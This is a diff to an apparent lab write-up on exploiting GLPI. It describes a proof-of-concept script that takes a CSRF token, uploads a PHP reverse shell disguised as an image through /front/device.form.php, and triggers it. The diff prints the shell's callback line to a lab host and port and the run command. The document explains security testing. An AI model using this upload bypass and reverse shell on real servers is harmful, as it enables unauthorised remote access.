@@ -197,10 +197,12 @@ a reliable reverse-shell exploit. The files used for this were:
 
 - `rce.py`: adapted PoC that retrieves a GLPI CSRF token, uploads a payload, and
   triggers it.
-- `shell.php.old`: PHP reverse shell payload configured to connect back to the
-  attacker host.
+- `shell.php`: PHP reverse shell payload configured to connect back to the
+  attacker host. In the submitted repository this payload is stored as
+  `shell.php.old` because the upload platform blocks `.php` files. The build
+  step creates the local working copy `shell.php`.
 
-The payload callback was configured in `shell.php.old`:
+The payload callback was configured in `shell.php`:
 
 ```php
 $sh = new Shell('192.168.56.1', 4444);
@@ -221,8 +223,7 @@ python3 rce.py http://192.168.56.102
 The adapted PoC performs the following steps:
 
 1. Requests `/index.php` and extracts the GLPI CSRF token.
-2. Reads the local payload file, using `shell.php.old` in the submitted
-   repository.
+2. Reads the local `shell.php` payload.
 3. Uploads the payload as `file.png` through `/front/device.form.php`.
 4. Requests `/front/files/file.png`, which triggers the uploaded PHP payload and
    opens the reverse shell.
